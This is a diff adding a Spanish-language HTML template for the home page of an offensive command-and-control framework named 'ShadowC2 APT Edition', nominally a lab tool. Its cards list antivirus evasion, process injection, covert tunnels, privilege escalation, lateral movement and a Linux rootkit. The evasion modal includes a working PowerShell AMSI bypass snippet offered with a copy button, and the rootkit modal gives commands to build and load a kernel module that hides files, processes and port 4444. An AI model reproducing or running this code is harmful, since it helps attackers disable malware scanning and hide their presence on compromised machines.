@@ -1,0 +1,198 @@
+{% extends "base.html" %}
+
+{% block title %}Inicio{% endblock %}
+
+{% block content %}
+<div class="welcome-section">
+    <div class="welcome-card">
+        <i class="fas fa-skull"></i>
+        <h1>ShadowC2</h1>
+        <p>Advanced Persistent Threat C2 Framework</p>
+        <p class="version">v2.0 APT Edition - Laboratorio de Ciberseguridad</p>
+    </div>
+</div>
+
+<div class="quick-stats">
+    <div class="quick-stat" onclick="location.href='/bots'">
+        <i class="fas fa-robot"></i>
+        <span id="qs-bots">0</span>
+        <label>Bots</label>
+    </div>
+    <div class="quick-stat online" onclick="location.href='/bots'">
+        <i class="fas fa-signal"></i>
+        <span id="qs-online">0</span>
+        <label>Online</label>
+    </div>
+    <div class="quick-stat" onclick="location.href='/commands'">
+        <i class="fas fa-terminal"></i>
+        <span id="qs-commands">0</span>
+        <label>Comandos</label>
+    </div>
+    <div class="quick-stat" onclick="location.href='/visits'">
+        <i class="fas fa-globe"></i>
+        <span id="qs-visits">0</span>
+        <label>Visitas</label>
+    </div>
+</div>
+
+<div class="features-grid">
+    <div class="feature-card" onclick="openModal('evasion')">
+        <i class="fas fa-shield-alt"></i>
+        <h3>Evasión AV</h3>
+        <p>AMSI Bypass, ETW Bypass, Direct Syscalls, Sleep Obfuscation</p>
+    </div>
+    <div class="feature-card" onclick="openModal('injection')">
+        <i class="fas fa-syringe"></i>
+        <h3>Inyección</h3>
+        <p>Process Hollowing, APC Injection, Reflective DLL, Thread Hijacking</p>
+    </div>
+    <div class="feature-card" onclick="openModal('tunnels')">
+        <i class="fas fa-network-wired"></i>
+        <h3>Túneles</h3>
+        <p>C2 over DNS, C2 over ICMP, Domain Fronting, DGA</p>
+    </div>
+    <div class="feature-card" onclick="openModal('privesc')">
+        <i class="fas fa-user-secret"></i>
+        <h3>PrivEsc</h3>
+        <p>UAC Bypass, Token Impersonation, LSASS Memory Dump</p>
+    </div>
+    <div class="feature-card" onclick="openModal('lateral')">
+        <i class="fas fa-arrows-alt-h"></i>
+        <h3>Mov. Lateral</h3>
+        <p>Pass-the-Hash, WMI Exec, PSExec, SSH Hijacking</p>
+    </div>
+    <div class="feature-card" onclick="openModal('rootkit')">
+        <i class="fas fa-linux"></i>
+        <h3>Rootkit</h3>
+        <p>LKM Linux, Hook de syscalls, Oculta archivos/procesos</p>
+    </div>
+</div>
+
+<!-- Modales -->
+<div id="modal" class="modal">
+    <div class="modal-content">
+        <span class="close" onclick="closeModal()">&times;</span>
+        <h2 id="modal-title"></h2>
+        <div id="modal-body"></div>
+    </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+async function loadQuickStats() {
+    try {
+        const resp = await fetch('/api/stats');
+        const s = await resp.json();
+        document.getElementById('qs-bots').textContent = s.total_bots;
+        document.getElementById('qs-online').textContent = s.online_bots;
+        document.getElementById('qs-commands').textContent = s.total_commands;
+        document.getElementById('qs-visits').textContent = s.total_visits;
+    } catch(e) {}
+}
+loadQuickStats();
+setInterval(loadQuickStats, 5000);
+
+const modalData = {
+    evasion: {
+        title: '<i class="fas fa-shield-alt"></i> Evasión AV',
+        body: `
+            <h4>Técnicas de Evasión</h4>
+            <ul>
+                <li><b>AMSI Bypass:</b> Parchea AmsiScanBuffer en memoria</li>
+                <li><b>ETW Bypass:</b> Deshabilita Event Tracing for Windows</li>
+                <li><b>Direct Syscalls:</b> Evita hooks de user-mode</li>
+                <li><b>Sleep Obfuscation:</b> Ofusca el payload durante sleep</li>
+            </ul>
+            <pre style="background:#0a0a0a;padding:10px;border:1px solid #333;margin-top:10px;"># AMSI Bypass (PowerShell)
+$a = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -like "*iUtils" }
+$b = $a.GetFields('NonPublic,Static') | Where-Object { $_.Name -like "*Context" }
+$b.SetValue($null, [IntPtr]::Zero)</pre>
+            <button class="btn" onclick="showToast('Payload de evasion copiado', 'success')">Copiar Payload</button>
+        `
+    },
+    injection: {
+        title: '<i class="fas fa-syringe"></i> Inyección de Procesos',
+        body: `
+            <h4>Técnicas de Inyección</h4>
+            <ul>
+                <li><b>Process Hollowing:</b> Crea proceso suspendido, reemplaza memoria</li>
+                <li><b>APC Injection:</b> QueueAPC en threads alertables</li>
+                <li><b>Reflective DLL:</b> Carga DLL desde memoria sin tocar disco</li>
+                <li><b>Thread Hijacking:</b> Suspende thread, inyecta shellcode</li>
+            </ul>
+            <button class="btn" onclick="location.href='/panel/privesc'">Ir a PrivEsc</button>
+        `
+    },
+    tunnels: {
+        title: '<i class="fas fa-network-wired"></i> Túneles C2',
+        body: `
+            <h4>Canales de Comunicación Ocultos</h4>
+            <ul>
+                <li><b>C2 over DNS:</b> Exfiltra datos via queries DNS TXT</li>
+                <li><b>C2 over ICMP:</b> Datos en payload de ping</li>
+                <li><b>Domain Fronting:</b> Usa CDN de confianza</li>
+                <li><b>DGA:</b> Genera dominios diarios para evadir blacklist</li>
+            </ul>
+            <button class="btn" onclick="showToast('Configuración de túneles generada', 'success')">Generar Config</button>
+        `
+    },
+    privesc: {
+        title: '<i class="fas fa-user-secret"></i> Privilege Escalation',
+        body: `
+            <h4>Escalada de Privilegios</h4>
+            <ul>
+                <li><b>UAC Bypass:</b> Fodhelper, ComputerDefaults, SDCLT</li>
+                <li><b>Token Impersonation:</b> Roba token de proceso SYSTEM</li>
+                <li><b>LSASS Dump:</b> Extrae credenciales de memoria</li>
+                <li><b>Kernel Exploits:</b> CVE-2021-36934, PrintNightmare</li>
+            </ul>
+            <button class="btn" onclick="location.href='/panel/privesc'">Ver Herramientas</button>
+        `
+    },
+    lateral: {
+        title: '<i class="fas fa-arrows-alt-h"></i> Movimiento Lateral',
+        body: `
+            <h4>Técnicas de Movimiento Lateral</h4>
+            <ul>
+                <li><b>Pass-the-Hash:</b> Usa NTLM hash sin conocer password</li>
+                <li><b>WMI Exec:</b> Ejecuta remoto via WMI</li>
+                <li><b>PSExec:</b> Servicio remoto con credenciales</li>
+                <li><b>SSH Hijacking:</b> Roba agente SSH o reutiliza sockets</li>
+            </ul>
+            <button class="btn" onclick="showToast('Módulo de movimiento lateral activado', 'success')">Activar Módulo</button>
+        `
+    },
+    rootkit: {
+        title: '<i class="fas fa-linux"></i> Rootkit LKM',
+        body: `
+            <h4>Rootkit Linux (Loadable Kernel Module)</h4>
+            <ul>
+                <li><b>Oculta archivos:</b> Prefijo <code>shadow_</code> invisible</li>
+                <li><b>Oculta procesos:</b> PIDs en lista negra desaparecen de ps/top</li>
+                <li><b>Oculta conexiones:</b> Puerto 4444 invisible en netstat</li>
+                <li><b>Hook syscalls:</b> getdents64, read, recvmsg</li>
+            </ul>
+            <pre style="background:#0a0a0a;padding:10px;border:1px solid #333;margin-top:10px;">cd modules/linux/rootkit
+make
+sudo insmod shadow_rootkit.ko</pre>
+            <button class="btn" onclick="showToast('Instrucciones copiadas', 'success')">Copiar</button>
+        `
+    }
+};
+
+function openModal(type) {
+    document.getElementById('modal-title').innerHTML = modalData[type].title;
+    document.getElementById('modal-body').innerHTML = modalData[type].body;
+    document.getElementById('modal').style.display = 'flex';
+}
+
+function closeModal() {
+    document.getElementById('modal').style.display = 'none';
+}
+
+window.onclick = function(e) {
+    if (e.target == document.getElementById('modal')) closeModal();
+}
+</script>
+{% endblock %}
